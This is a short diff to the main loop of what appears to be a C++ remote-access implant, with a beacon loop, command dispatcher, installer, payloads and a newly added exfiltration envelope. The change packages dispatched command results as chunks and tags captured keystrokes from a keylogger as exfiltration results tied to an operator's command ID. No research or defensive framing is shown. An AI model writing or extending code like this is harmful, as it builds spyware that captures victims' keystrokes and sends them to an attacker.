@@ -7,6 +7,7 @@
 #include "BeaconLoop.hpp"
 #include "CommandDispatcher.hpp"
 #include "Config.hpp"
+#include "ExfilEnvelope.hpp"
 #include "Installer.hpp"
 #include "Payloads.hpp"
 #include "SessionManager.hpp"
@@ -59,20 +60,21 @@ int main(int argc, char* argv[]) {
         for (const auto& cmd : command_list) {
             logger::debug("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
 
-            auto result = dispatcher.dispatch(cmd);
-            beacon_state.add_result(result);
+            auto results = dispatcher.dispatch(cmd);
+            beacon_state.enqueue_chunks(std::move(results));
 
             if (cmd.command.starts_with("uninstall")) {
                 running = false;
                 break;
             }
 
-            if (keylogger.is_running()) {
+            if (keylogger.is_running() && !keylogger.active_command_uid().empty()) {
                 auto logs = keylogger.collect_and_clear();
                 if (not logs.empty()) {
                     CommandResult key_result;
-                    key_result.command_uid = "kl_" + get_or_create_implant_id();
-                    key_result.status = 1;
+                    key_result.command_uid = keylogger.active_command_uid();
+                    key_result.status = exfil::kStatusSuccess;
+                    key_result.kind = std::string(exfil::kKindKeylogger);
 
                     std::string flattened;
                     for (const auto& k : logs) {
